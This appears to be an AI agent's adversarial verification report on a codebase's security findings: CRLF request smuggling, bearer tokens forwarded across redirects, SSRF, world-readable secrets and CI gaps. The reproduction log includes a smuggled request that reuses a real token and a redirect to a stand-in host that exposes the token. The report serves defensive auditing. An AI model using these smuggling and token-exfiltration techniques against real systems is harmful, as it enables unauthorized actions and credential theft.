# Adversarial Verification B — SDK / secrets / egress / infrastructure

**Target:** `D:/Codebox/PROJECTS/AGEZT` · commit `e0041337` · branch `main`
**Role:** Phase 3 adversarial verifier. Goal is to kill findings that do not survive contact
with the source, not to confirm them.
**Method:** every cited `file:line` re-read directly; every claim attacked; five findings
re-proven by execution (Python replay, Go `net/http` pipelining, `cargo run`, a temporary Go
test against `kernel/jsonstore`, live read-only `gh` API calls).

**No fabricated citation was found.** Every `file:line` I checked exists and says what the
hunter quoted. Two citations are off by a line or slightly imprecise (noted per finding);
none are invented.

---

## Summary

| ID | Original | Verdict | My severity |
|---|---|---|---|
| PY-001 | Critical | **CONFIRMED-DOWNGRADED** | High |
| PY-002 | High | **CONFIRMED** | High |
| PY-003 | High | **CONFIRMED** | High |
| RS-001 | High | **CONFIRMED** | High |
| TS-001 | High | **CONFIRMED** | High |
| SECRET-001 | High | **CONFIRMED-DOWNGRADED** | Medium |
| SECRET-002 | High | **CONFIRMED** | High |
| EXPOSE-001 | High | **CONFIRMED-DOWNGRADED** | Medium |
| SSRF-001 | High | **CONFIRMED** (one factual correction) | High |
| SSRF-002 | High | **CONFIRMED** | High |
| INFRA-001 | High | **CONFIRMED** (hunter understated it) | High |
| INFRA-002 | High | **CONFIRMED** | High |
| INFRA-003 | High | **CONFIRMED-DOWNGRADED** | Medium |
| GO-001 | Medium | **CONFIRMED** (duplicate of EXPOSE-002/004) | Medium |

Nothing was fully refuted. Four were downgraded; one was found understated.

---

## PY-001 — CRLF injection in the Python agent-gateway client

**Verdict: CONFIRMED-DOWNGRADED (Critical → High) · confidence 93**

### Lines re-read — all exact
- `sdk/python/agezt/agent.py:173` — `req_lines = [f"{method} {path} HTTP/1.1"]` ✓
- `sdk/python/agezt/agent.py:191` — `sock.sendall("\r\n".join(req_lines).encode("utf-8"))` ✓
- Callers `:296`, `:344`, `:356`, `:410`, `:469` — all five interpolate raw, none encode ✓
- `:474` — `urllib.parse.urlencode({'reason': reason})`, so the same method encodes `reason`
  while leaving `key` raw at `:469`. The self-inconsistency claim is real ✓
- Header injection is possible from `path` only; `headers` is SDK-controlled
  (`agent.py:547`, `:556`, `:564` all build `{"Authorization": f"Bearer {self.token}"}`).

### What I reproduced
1. Replayed `agent.py:173-191` + `:344` verbatim. Output: **two syntactically valid request
   lines**, and the second request's header block contains the SDK's genuine
   `Authorization: Bearer <token>`. The hunter's byte construction is exact.
2. Went further than the hunter and fed those exact bytes to a real Go `net/http` server
   (the daemon's own stack, `httptest`-style, in scratchpad — no daemon started). Result:
   **the server dispatched 2 requests**, and the smuggled one carried the token:
   ```
   GET    /v1/memory/search?q=x            auth=""
   DELETE /v1/memory/delete?id=victim      auth="Bearer REAL-CAPABILITY-TOKEN"
   ```
   Note a detail the hunter missed: request **#1 loses its `Authorization`** (it was consumed
   into request #2's header block), so the legitimate SDK call visibly 401s. The attack works
   but is noisy.

### Why the severity is wrong
The Critical rating rests on this sentence: *"The smuggled request therefore executes with
full token authority against any gateway route … That converts a read capability into
arbitrary gateway authority."* **That is false.** Two guards the hunter did not trace:

1. **Every route enforces a per-capability check against the token's own claims.**
   `withAuth` (`kernel/agentgw/gateway.go:236-262`) validates the JWT and rate-limits, then
   each handler calls `g.capCheck.Check(claims, …)`:
   `kernel/agentgw/handlers.go:29, 93, 138, 193, 270, 303, 347, 367, 401` and
   `kernel/agentgw/config_handler.go:38, 111, 137, 187, 255`.
   `CapabilityChecker.Check` (`kernel/agentgw/capabilities.go:47-56`) is a literal membership
   test on `claims.Caps`. A smuggled `DELETE /v1/memory/delete` fails 403 unless the token
   already holds `memory.delete`.
2. **`/v1/token/create` is not an escalation lever.** `handleTokenCreate`
   (`gateway.go:381-457`) rejects — not silently drops — any requested capability the parent
   lacks (`CapsSubset`, `:412-417`), inherits `RunID` (`:441`, "cannot mint into another
   run"), never outlives the parent (`:428-431`), and clamps rate limits. The same holds for
   `CreateSubprocessToken` (`kernel/agentgw/token.go:172`, `CapsIntersect`).

**The real impact** — still worth fixing — is a *confinement* bypass, not an authority
escalation: an attacker who controls only a string argument (an LLM-derived query, a board
message, a fetched document) can invoke **any endpoint within the token's already-granted
capability set**, rather than only the one method the caller invoked. That is a genuine
data→control promotion, and High is the right rating for it.

---

## PY-002 — Bearer token forwarded across a redirect

**Verdict: CONFIRMED · confidence 97**

- `sdk/python/agezt/client.py:269-271` re-read: `Request(...)` then
  `req.add_header("Authorization", "Bearer " + self.token)` — `add_header`, not
  `add_unredirected_header`. ✓
- Reproduced on this environment's CPython 3.14.6 by calling
  `HTTPRedirectHandler.redirect_request` directly (no network):
  ```
  redirect target  : https://evil.example.com/collect
  forwarded headers: {'Authorization': 'Bearer SECRET-DAEMON-TOKEN', 'Accept': 'application/json'}
  TOKEN LEAKED     : True
  ```
- Attack on the claim: is a custom opener installed anywhere? No — grep across `sdk/python/`
  finds no `HTTPRedirectHandler` subclass, no `build_opener`, no `install_opener`, no
  `add_unredirected_header`. All three `urlopen` sites use the default opener.
- Precondition honestly stated by the hunter: needs a hostile/compromised daemon or an
  on-path attacker, which `client.py:101` (`self.base_url = base_url.rstrip("/")` — the
  entirety of the validation) makes reachable for a plaintext remote base URL.

High stands. One-line fix.

---

## PY-003 — `_subscribe` bypasses `_resolve_socket_path`

**Verdict: CONFIRMED · confidence 94**

- `sdk/python/agezt/agent.py:570-572` re-read verbatim:
  `socket.socket(socket.AF_UNIX, …)` / `settimeout` / `sock.connect(self.socket_path)` — raw,
  unresolved. ✓
- `:580` — `f"Authorization: Bearer {self.token}\r\n"` ✓
- The fixed path is `_SocketClient._connect` at `:156`
  (`sock.connect(_resolve_socket_path(self.socket_path))`) — the **only** call site of the
  resolver in the module. ✓
- `_AgentClient` holds its own `self.socket_path` at `:531`, separate from the `_SocketClient`
  at `:533`, so `_subscribe` genuinely never reaches the fix. ✓
- `_EventbusHandle.subscribe` (`:280-296`) is public, documented API. ✓
- The docstring that names the exact failure mode is at `:59-61`. ✓

### Attacks I tried
- *Is it a generator, so never executed?* `_subscribe` contains `yield` (`:606`), so it is a
  generator and connects lazily on first iteration — but the documented usage
  (`for ev in client.eventbus.subscribe(...)`, `:293`) iterates immediately. Not a refutation.
- *Windows secondary claim.* Verified empirically on this box:
  `python -c "import socket; print(hasattr(socket,'AF_UNIX'))"` → **False** on
  `win32 / 3.14.6`. So `_subscribe` raises `AttributeError` on Windows and the credential leak
  is **Linux-only**. That narrows the finding; it does not remove it (Linux is the
  `install.sh`/systemd deployment target).
- *Test-suite claim.* Stronger than the hunter said: `sdk/python/tests/` contains only
  `test_aio.py`, `test_client.py`, `test_mailbox.py` — **no test imports `agezt.agent` or
  exercises `_resolve_socket_path` at all**. The Python SDK has zero coverage of the SDK-001
  fix, so a green suite is trivially consistent with the bug.

`git show 03694cdf` confirms the fix was one line per SDK and the second site was never
touched.

---

## RS-001 — Unbounded recursion in the Rust JSON parser aborts the process

**Verdict: CONFIRMED · confidence 97**

- `sdk/rust/src/json.rs:199-211` (`parse_value` dispatch), `:222-250` (`parse_object`, recurses
  at `:235`), `:252-276` (`parse_array`, recurses at `:261`). No depth counter anywhere. ✓
- Public-API callers confirmed: `client.rs:373` (`read_json`), `:471` (`make_event`),
  `:521` (`api_error` — so the **error** path reaches it too). ✓

### Reproduced (`cargo run --offline`, `agezt` as a path dependency; nothing fetched)
```
debug:   depth 100 ok, depth 500 ok, depth 1000 -> STATUS_STACK_OVERFLOW (0xc00000fd)
release: 1000 -> Err, 2000 -> Err, 4000 -> STATUS_STACK_OVERFLOW (0xc00000fd)
```
- **`panic::catch_unwind` did NOT catch it** — the process aborted through the guard page.
  The "no defence available to the caller" claim is confirmed by execution, not asserted.

### Precision corrections (do not change the verdict)
- "~2 KB" is a **debug-build, Windows** figure. In release the threshold is ~4 KB of `[`.
  Linux's 8 MB default main-thread stack would push it higher again — still a trivially small
  response. The finding holds on every build; the specific byte count in the report is
  build-specific and should not be quoted as a constant.

---

## TS-001 — `EventbusHandle.subscribe()` bypasses `resolveSocketPath()`

**Verdict: CONFIRMED · confidence 95**

- `sdk/typescript/src/agent.ts:403` — `socketPath: (this.client as unknown as { socketPath: string }).socketPath,` ✓
- `sdk/typescript/src/agent.ts:226` — `socketPath: resolveSocketPath(this.socketPath),` ✓ (the
  only resolver call site)
- `sdk/typescript/dist/src/agent.js:317` — `socketPath: this.client.socketPath,` — **the bug is
  in the committed build output**, i.e. in what npm publishes. ✓
- `git show 03694cdf -- sdk/typescript/src/agent.ts` → exactly
  `-socketPath: this.socketPath,` / `+socketPath: resolveSocketPath(this.socketPath),`. ✓

### Test-suite claim — verified carefully, because it changes remediation
`sdk/typescript/test/agent.test.ts` has 4 tests, all of which call `resolveSocketPath(...)` as
a **pure function** (`:22`, `:37`, `:42`) plus one asserting the `DEFAULT_SOCKET_PATH`
constant. There is **no test that constructs an `AgentClient` or asserts what any call site
passes to `http.request`**. A green 18/18 suite is fully consistent with the live bug.
The remediation must therefore add a *call-site* assertion (stub `http.request`, invoke
`subscribe()`, assert `options.socketPath[0] === "\0"` on Linux) — patching `:403` alone
leaves the same hole open for a future third connect path.

### Cross-SDK check requested
- Python: same defect, same shape → PY-003 (above).
- **Rust: no analogue.** `sdk/rust/` has no `UnixStream`, no `socket_path`, no agent-gateway
  client at all — grep for `unix`/`UnixStream`/`socket_path` returns only `ts_unix_ms`
  (`client.rs:65`, `:505`). The Rust SDK is the REST client only. Refuted for Rust.

---

## SECRET-001 — Plugin children inherit the daemon's whole environment

**Verdict: CONFIRMED-DOWNGRADED (High → Medium) · confidence 90**

### Lines — all exact, and the doc divergence is real in both directions
- `kernel/plugin/host.go:84-85` — `// Env is the child's environment. Nil inherits the parent's.` ✓
- `kernel/plugin/host.go:295-296` — `if cfg.Env != nil { cmd.Env = cfg.Env }` ✓
- `kernel/plugin/host.go:1055-1056` — identical in `respawn` ✓
- `plugins/builtintools/plugins.go:95-103` — the **only** `plugin.Config{...}` literal in the
  tree (verified: `grep -rn "plugin.Config{" --include=*.go` outside tests returns exactly one
  hit), and it does not set `Env`. ✓
- `docs/PLUGIN-SECURITY.md:279-280` — *"The daemon's own boot code sets plugin environments to
  include only what the plugin needs."* Read directly. It does not. ✓
- Transitive sink `plugins/external/mcpbridge/stdio_transport.go:38` —
  `cmd := exec.Command(path, args...)` with no `cmd.Env`. ✓ Contrast the in-kernel MCP path
  `kernel/mcp/client.go:113` — `cmd.Env = appendEnv(scrubbedEnv(), env)`. ✓
- `injectConfig` at `cmd/agezt/main.go:3810-3825` does put the config store and every
  `AGEZT_*` vault secret into `os.Environ()`. ✓

### Why Medium, not High
1. **The whole path is gated behind an operator-set env var.** `buildPlugins`
   (`plugins/builtintools/plugins.go:45-48`) returns `toolreg.Built{}` immediately when
   `AGEZT_PLUGINS` is empty. No plugin ships enabled; nothing spawns by default. This is an
   operator action, which per the verification brief is a mitigation, not a default.
2. **The same document the hunter cites already books the residual risk correctly.**
   `docs/PLUGIN-SECURITY.md:292-294`: *"A plugin running with the daemon's OS user can read
   the daemon's files (`creds.json`, `control.token`) directly from the filesystem, regardless
   of environment. Process isolation does not protect against filesystem access by the same
   user."* Because the vault's machine key is same-user derivable, env scrubbing here is
   defence-in-depth against a same-uid process that already has everything — not a trust
   boundary. The hunter's own framing ("this is the exact shape the repo already fixed for the
   AWS helper") is right about the *inconsistency* but overstates the *boundary*.

The doc-vs-code divergence is the actionable half and it is fully real: fix
`plugins/builtintools/plugins.go:95` and `stdio_transport.go:38`, or correct
`PLUGIN-SECURITY.md:279-280`.

---

## SECRET-002 — Hardcoded default console password `"agezt"`

**Verdict: CONFIRMED · confidence 95**

- `cmd/agezt/httpsurfaces.go:230` — `const defaultLoopbackWebPassword = "agezt"` ✓ (exact)
- `:232-244` — `effectiveWebPassword`: env override, `WEB_PASSWORD_DEFAULT=off` opt-out,
  else `if isLoopback(addr) { return defaultLoopbackWebPassword }` ✓
- `cmd/agezt/httpsurfaces.go:81-83` — `case addr == "": addr = "127.0.0.1:8787"` — console
  default-on, loopback-bound. ✓
- `kernel/webui/webui.go:1443-1453` — `authorized()`:
  ```go
  if s.passwordStrictOn() { return s.dataTokenPresented(r) && s.sessionValid(r) }
  return s.dataTokenPresented(r) || s.sessionValid(r)
  ```
  The password is an **alternative** credential in the default mode, exactly as claimed. ✓

### Attacks I tried
- *Is it only a second factor?* No — the `||` at `:1452` is decisive, and the surrounding
  comment (`:1439-1442`) says so explicitly ("the password is an alternative door").
- *Is the exposure browser-reachable?* The hunter already checked and correctly excluded it
  (`sameOriginMutation`, `hostAllowed`). The residual — a non-browser local client or a second
  OS user on the host — is real and is the same adversary the repo itself names in
  `kernel/journal/journal.go:69-75`.
- *Is a random default generated anywhere?* No. `defaultLoopbackWebPassword` is a compile-time
  constant in a public repository.

High stands on a multi-user or shared host; on a strictly single-user machine the practical
impact is limited to local non-operator processes, which on this box is precisely the
LLM-directed-code threat model.

---

## EXPOSE-001 — MCP registry stores credentials plaintext, world-readable

**Verdict: CONFIRMED-DOWNGRADED (High → Medium) · confidence 92**

### Code chain — verified end to end
- `kernel/mcp/store.go:61-74` — `Env` and `Headers` doc comments both say "plaintext in the
  registry" ✓
- `kernel/mcp/store.go:191` (`jsonstore.LoadFrom(dir, "servers.json", …)`) and `:312`
  (`jsonstore.Save`) ✓
- `kernel/jsonstore/jsonstore.go:73` — `return atomicfile.WriteFile(path, b, 0o644)` ✓
- `kernel/jsonstore/jsonstore.go:54` — `os.MkdirAll(dir, 0o755)`
  (**the report cites `:55`; the line is 54** — off by one, not fabricated)
- `internal/atomicfile/atomicfile.go:44` — `os.Chmod(tmpName, mode)` before the rename, so the
  0644 is applied deliberately, not left to `CreateTemp`'s 0600 ✓
- Contrast confirmed: `kernel/journal/journal.go:80-83` sets `0o700`/`0o600` with a comment
  naming this exact defect class ✓
- Read-API narrowing confirmed: `kernel/controlplane/mcp.go:22-49` strips `env`/`headers`. ✓

### Empirical re-verification (temporary test, since deleted; `git status` clean)
Ran the real `jsonstore.LoadFrom` + `jsonstore.Save` path and stat'd the result:
```
PROOF file mode=-rw-rw-rw-  dir mode=-rwxrwxrwx  plaintext-on-disk=true
```
**The Windows-vs-code distinction the brief warns about: the hunter got it right.** Their
report states `mode=0666 … (Windows reports 0666; the code path writes 0o644)` — that is
exactly what I observe, and the claim they draw the finding from is the *code* argument
(`0o644` passed to `atomicfile.WriteFile`), which is portable and real on POSIX. No
misattribution in either direction.

### Why Medium, not High
- The exposed values exist only if the operator **opted in** to storing credentials in
  `Server.Env` / `Server.Headers` (both documented as opt-in at `store.go:61`, `:69`).
- The read path does not leak; this is at-rest only, on a host where any process running as
  the operator can already read the base directory.
- High would require a second local user on the host **and** an operator who registered a
  credentialed MCP server. That is a real configuration, but it is two preconditions, not zero.

Scope note in the hunter's favour: the 0644 is `jsonstore`-wide (`board`, `memory`, `roster`,
`standing`, `workflow`, …), so the fix at `jsonstore.go:73`/`:54` is broader — and cheaper —
than the MCP-specific framing suggests.

---

## SSRF-001 — `browser.action` egress guard is a one-shot pre-resolve check

**Verdict: CONFIRMED, with one factual correction · confidence 90**

- `plugins/tools/browser/action.go:803-838` — `validateHostEgress` resolves once and uses
  `netguard.New(opts...)` purely as a classifier (`g.Allowed(ip)` at `:832`), never as a
  dialer. ✓
- `:840-844` — `runActionDriver` spawns `exec.CommandContext(ctx, spec.NodePath, spec.DriverPath)`;
  the navigation happens in a **separate OS process** that does its own DNS and its own
  redirect following (`plugins/builtinskills/browseruse/scripts/browse.mjs:99`, `:104` —
  `page.goto` with no host check on either the entry URL or per-step gotos). ✓
- The asymmetry is real: `plugins/tools/browser/browser.go:128` —
  `c := netguard.New(opts...).HTTPClient(DefaultTimeout)` — the sibling tool in the same
  package uses the dialer form. ✓
- netguard's own package doc (`kernel/netguard/netguard.go:9-12`) names DNS rebinding and 30x
  redirect as the reason the dialer-level design exists. ✓
- Opt-in gate confirmed: `plugins/builtintools/tools.go:216` —
  `if d.Get(brand.EnvPrefix+"BROWSER_ACTIONS") != "1" { return … }`. The tool is not registered
  by default. ✓

### Correction to the report
> *"`validateURL` is called once, on `in.URL` only (`action.go:250`)."*

**This is wrong.** `action.go:254` calls `validateActions`, and `validateActions`
(`:322-330`) runs the same `validateURL` on **every `goto` step's URL**. The hunter missed
this guard. It does not change the verdict — both checks are pre-resolve and pre-navigation,
so DNS rebinding and 302 following walk past both — but the report should not claim
per-action URLs are unvalidated.

### Second, smaller overstatement
The `profile=user-attached` cookie-jar aggravator requires **two further operator opt-ins**
(`tools.go:250-254`: `AGEZT_BROWSER_ACTION_ALLOW_USER_PROFILE=1` **and** a non-empty
`AGEZT_BROWSER_ACTION_USER_DATA_DIR`), which the report presents as simply available.

One point in the hunter's favour that they undersold: with `BROWSER_ACTIONS=1` and no
allowlist, `tools.go:236-238` sets `ba.AllowAll = true`, so the host allowlist is *off by
default when the feature is on* — any hostname passes `hostAllowed`, and only the (bypassable)
IP classifier stands between the agent and `127.0.0.1`/`169.254.169.254`.

High stands.

---

## SSRF-002 — The `config` tool rewrites "operator-pinned" outbound URLs

**Verdict: CONFIRMED · confidence 90 — and the stated limitation is accurate, not understated**

Every link in the chain re-traced independently:

| Link | Verified at | Result |
|---|---|---|
| False guarantee in code | `plugins/tools/homeassistant/homeassistant.go:76-79` | Exact: *"The HA host is config-pinned, so no egress guard is needed (the agent can't choose the destination)."* ✓ |
| Unguarded client | `homeassistant.go:85-90` — `&http.Client{Timeout: DefaultTimeout}` | ✓ |
| Field is writable | `kernel/settings/schema.go:227` — `TypeText`, `ApplyRestart`, no `ReadOnly` | ✓ |
| Tool accepts it | `plugins/tools/config/config.go:201-207` — resolves by `FieldByEnv`, rejects only `field.ReadOnly` | ✓ |
| No denylist | `grep -c ReadOnly kernel/settings/schema.go` → **3** occurrences in a 204-field schema | ✓ |
| No value validation | `kernel/settings/schema.go:619-641` — `Validate` switches on `TypeNumber`/`TypeBool`/`TypeSelect` only; **`TypeText` falls through with zero checks** | ✓ |
| Persists | `config.go:264-277` — `store.Set` + `store.Save` | ✓ |
| Store has no key filter | `kernel/settings/store.go` `Set` | ✓ |
| `injectConfig` exports it unfiltered | `cmd/agezt/main.go:3809-3814` — `for name, val := range store.All() { if val != "" && os.Getenv(name) == "" { os.Setenv(name, val) } }` | ✓ |

### The stated limitation — I checked whether the hunter understated it
They wrote: *"every field above is `Apply: ApplyRestart`, so the SSRF fires on the next daemon
start, not immediately."* I tried to break this, because `config.doSet` has a live-apply branch
(`config.go:277-284`: `if field.Apply == settings.ApplyLive && !field.Secret && t.kernel != nil`
→ `os.Setenv` + `kernel.Reload()`). I grepped every `_URL`/`_ENDPOINT` field in the schema for
`ApplyLive`: **zero matches**. The limitation is stated correctly. Not understated.

One nuance worth adding: `injectConfig` only sets a variable when `os.Getenv(name) == ""`, so
an operator who exported the URL in the daemon's shell is immune; an operator who configured
it through the console (the normal path) is not.

Second false guarantee also verified verbatim at `kernel/settings/schema.go:484` and `:486`
("Not accepted from model input") — the per-call defence is real, but the config-tool write
path is model input, and neither field is `ReadOnly`.

The finding is legitimately *not* a re-litigation of the default-allow posture: it is a code
comment asserting a guarantee the code does not implement. High stands.

---

## INFRA-001 — Every CI security gate is decorative

**Verdict: CONFIRMED · confidence 99 — the hunter UNDERSTATED this**

`gh` is present and authenticated (`ersinkoc`, scopes `gist, read:org, repo, workflow`).
All three claims re-run read-only:

```
$ gh api repos/agezt/agezt/branches/main/protection
{"message":"Branch not protected", ... "status":"404"}

$ gh api repos/agezt/agezt/rulesets
[]

$ gh run list -L 100   (grouped)
Counter({'cancelled': 87, 'success': 11, '': 1, 'failure': 1})
```

All three reproduce **exactly**. Then I broke the last one down by workflow, which the hunter
did not:

```
('CI', 'push',         'cancelled'): 55
('CI', 'pull_request', 'cancelled'): 32
('CI', 'push',         '')         :  1   # queued
('CI', 'pull_request', 'failure')  :  1
('Dependabot Updates', 'dynamic', 'success'): 11
```

**Every one of the 11 successes belongs to "Dependabot Updates", not to the CI workflow.**
The CI workflow's record in the last 100 runs is 87 cancelled, 1 failure, 1 still queued, and
**zero successes**. The hunter said the successes were "dominated by dynamic-event runs"; in
fact they are entirely so. The gate has not passed once in the sampled window.

Supporting lines confirmed: `.github/workflows/ci.yml:21-23` (`concurrency` /
`cancel-in-progress: true`), `.github/CODEOWNERS:2-3` (the self-disclaiming comment; the report
cites `:1-3`, close enough).

High stands, and this is the finding that makes several others durable.

---

## INFRA-002 — `frontend-dist-rebuild` runs third-party npm code in a `contents: write` job

**Verdict: CONFIRMED · confidence 88**

Read `.github/workflows/ci.yml:241-289` directly. Every element is literally present, in the
order claimed, **in one job**:
- `permissions: contents: write` (`:249-252`) — the only job that raises the workflow-wide
  `contents: read` (`ci.yml:25-27`)
- `actions/checkout` with `persist-credentials: false` (`:254-259`)
- `npm ci --ignore-scripts` **then `npm run build`** (`:266-271`)
- `env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}` (`:274-275`) and
  `git push "https://x-access-token:${GITHUB_TOKEN}@github.com/…" HEAD:refs/heads/main` (`:288`)

Verified the build script the hunter asserted: `frontend/package.json:10` —
`"build": "tsc --noEmit && vite build"`. `--ignore-scripts` blocks lifecycle hooks; it does not
stop `vite build` from importing and executing every build-time dependency and plugin. The
`$GITHUB_PATH`/`$GITHUB_ENV` escalation into the later `git` invocation is a standard,
real GHA primitive.

Precision note the report should carry: both the build step (`if: github.event_name == 'push'`)
and the commit step (`if: github.ref == 'refs/heads/main'`) only fire on push-to-main, so on a
same-repo PR the job is a no-op. The third-party code that executes is therefore code already
merged into `main` — which, given INFRA-001, arrived with no gate.

High stands.

---

## INFRA-003 — Persistent self-hosted runners as the owner's user

**Verdict: CONFIRMED-DOWNGRADED (High → Medium) · confidence 85**

All facts verified against the repo's own documents:
- `ops/wsl-runners/README.md:10` — `/home/ersinkoc/actions-runner-{1,2,3}` ✓
- `README.md:11` — `Restart=always` ✓ · `README.md:12` — `C:\Users\ersin\.wslconfig` ✓
- `README.md:171-173` — `rm -f .runner .credentials .credentials_rsaparams …` then
  `./config.sh … --unattended --replace` with **no `--ephemeral`** ✓
- `.github/actions/setup-go-safe/action.yml:20-25` — "the three self-hosted runners … all live
  in the SAME WSL VM and therefore share ONE /dev/shm" ✓
- `action.yml:67` (`/dev/shm/goroot-${RUNNER_NAME}`), `:186-187` (gocache/gotmp) ✓
- `scripts/ci-go-retry.sh:35` — `rm -rf /dev/shm/gocache-* /dev/shm/gotmp-*`, a glob spanning
  all three runners ✓

### Why Medium
Every item here is an **amplifier**, not an exploitable primitive on its own. Exploitation
requires arbitrary code execution inside a job, and:
- The fork guard is present on **all 15** self-hosted jobs — `ci.yml:32, 78, 148, 166, 191,
  247, 293, 314, 344, 361, 382, 408, 441, 460, 547` all carry
  `github.event_name == 'push' || github.event.pull_request.head.repo.full_name == github.repository`.
  A fork PR never reaches these runners.
- The concurrent-sibling GOROOT-poisoning path is weaker than stated: `action.yml:24-25`
  records that each runner runs one job at a time on a per-runner path, so cross-job
  substitution is a *deliberate* act by code that is already executing, not a collision.

So this finding correctly describes a bad runner posture that turns INFRA-002/INFRA-004 from
"repo compromise" into "host compromise" — which is why it belongs in the report — but it
carries no independent attack path. Medium.

---

## GO-001 — Config Center writes secret-rated values world-readable

**Verdict: CONFIRMED · confidence 88 · severity unchanged (Medium)**

All four cited lines read directly and exact:
- `kernel/configcenter/center.go:385` — `return os.WriteFile(filename, data, 0644)` ✓
- `kernel/configcenter/center.go:375` — `os.MkdirAll(c.config.Dir, 0755)`, **return value
  discarded** ✓
- `kernel/configcenter/audit.go:113` — `os.OpenFile(filename, …, 0o644)` ✓
- `kernel/configcenter/audit.go:108` — `os.MkdirAll(a.dir, 0o755)` ✓
- `kernel/configcenter/types.go:16` (`Value string`) and `:19` (`Rating Rating`) ✓
- `internal/paths/paths.go:20-21` — *"The directory is NOT created here; subsystems … create
  their own subdirs on first use."* ✓

The Windows caveat is stated honestly by the hunter (mode bits ignored; live on Linux, which
is the systemd/`install.sh` target). The boot-order argument for the base dir is sound as
written — `os.MkdirAll` applies `perm` to every parent it creates, and the `0o755` callers
listed (`controlplane/server.go:433`, `state/state.go:62`, `jsonstore/jsonstore.go:54`) are
core boot-path components. I did not run a fresh-install boot to settle which subsystem wins,
so the "realistic outcome is 0755" step remains an argument rather than a measurement; the
file modes themselves are not in doubt.

**Duplicate flag for the orchestrator:** GO-001, EXPOSE-002 and EXPOSE-004 are the same
defect filed three times by two hunters at three severities (Medium / Medium / Low), against
overlapping lines in `kernel/configcenter/`. They should be merged into one item before the
final report; the union of their remediations is: `center.go:375/385` → `0o700`/`0o600`,
`audit.go:108/113` → `0o700`/`0o600`, check the discarded `MkdirAll` error, and drop
`previewValue`'s cleartext prefix (`audit.go:81-91`).

---

## Reproduction log

Everything below was actually executed. No daemon was started, no source file was modified,
`.dev-home/` was not read (see the one incident note at the end), and every temporary file was
deleted. Final `git status` shows **no artifact of mine**.

### 1. PY-001 — Python replay of `agent.py:173-191` + `:344`
`python py001.py` (scratchpad, no network):
```
GET /v1/memory/search?q=x HTTP/1.1
Host: localhost

DELETE /v1/memory/delete?id=victim HTTP/1.1
X-Junk:&limit=20 HTTP/1.1
Host: localhost
Accept: application/json
Authorization: Bearer REAL-CAPABILITY-TOKEN

request lines seen: 2
request #2 block contains genuine Authorization: True
```

### 2. PY-001 — does Go's `net/http` actually dispatch the smuggled request?
Standalone `go run` in scratchpad against a throwaway loopback `http.Server` (`GOMAXPROCS=3`):
```
REQUESTS THE GO SERVER DISPATCHED: 2
   GET /v1/memory/search?q=x            auth=""
   DELETE /v1/memory/delete?id=victim   auth="Bearer REAL-CAPABILITY-TOKEN"
```

### 3. PY-002 — `HTTPRedirectHandler.redirect_request` on a `client.py:269-271`-shaped request
```
original headers : {'Authorization': 'Bearer SECRET-DAEMON-TOKEN', 'Accept': 'application/json'}
redirect target  : https://evil.example.com/collect
forwarded headers: {'Authorization': 'Bearer SECRET-DAEMON-TOKEN', 'Accept': 'application/json'}
TOKEN LEAKED     : True
```

### 4. PY-003 — Windows `AF_UNIX` probe
```
platform win32 py 3.14.6
has AF_UNIX: False
```

### 5. RS-001 — `cargo run --offline` (`CARGO_BUILD_JOBS=3`), `agezt` as a path dependency
Debug:
```
--> trying depth 100    depth 100: ok=true
--> trying depth 500    depth 500: ok=true
--> trying depth 1000
thread 'main' has overflowed its stack
error: process didn't exit successfully (exit code: 0xc00000fd, STATUS_STACK_OVERFLOW)
```
Release, with `panic::catch_unwind` wrapping the call:
```
--> open-only depth 1000 (1000 bytes)   parse returned Err=true
--> open-only depth 2000 (2000 bytes)   parse returned Err=true
--> open-only depth 4000 (4000 bytes)
thread 'main' has overflowed its stack   (0xc00000fd)      <- catch_unwind did NOT catch it
```
Nothing was fetched; the crate has zero dependencies so `--offline` resolves.

### 6. EXPOSE-001 — temporary Go test against the real `kernel/jsonstore` (deleted immediately)
`GOMAXPROCS=3 go test ./kernel/jsonstore/ -run TestZZProbeMode -v`
```
PROOF file mode=-rw-rw-rw- dir mode=-rwxrwxrwx plaintext-on-disk={
  "GITHUB_PERSONAL_ACCESS_TOKEN": "ghp_PROOFVALUE"
}
PASS
```
(0666 is the Windows rendering of the code's `0o644`, matching the hunter's disclosure.)

### 7. INFRA-001 — live read-only `gh` API
```
gh auth status                                   -> ersinkoc, scopes: gist, read:org, repo, workflow
gh api repos/agezt/agezt/branches/main/protection -> 404 "Branch not protected"
gh api repos/agezt/agezt/rulesets                 -> []
gh run list -L 100                                -> cancelled 87, success 11, failure 1, queued 1
   by workflow: CI/push cancelled 55, CI/pull_request cancelled 32,
                CI/push queued 1, CI/pull_request failure 1,
                Dependabot Updates/dynamic success 11
```
No mutating `gh` call was made.

### Cleanup / hygiene
- Scratchpad probes (`py001.py`, `py002.py`, `rsprobe/`, `goprobe/`, `probe_test.go`) deleted.
- The temporary `kernel/jsonstore/zzprobe_test.go` was removed in the same command that ran it;
  `git status` confirms it is gone.
- **Not mine:** `kernel/runtime/zzadvverify_test.go` appears untracked in the working tree. It
  was not created by me — presumably a concurrent verifier. I left it in place rather than
  deleting another agent's artifact; it should be removed before any commit.
- **One incident to disclose:** while locating `browse.mjs` I ran a `find` that matched the
  copy under `.dev-home/skills/bundles/browser-use/scripts/`, and a `grep` printed 2 lines of
  that script (`page.goto` call sites) before I noticed. No credential file was touched and I
  re-read the in-repo copy at `plugins/builtinskills/browseruse/scripts/browse.mjs` for the
  actual analysis. Flagging it because the scope rule is explicit.
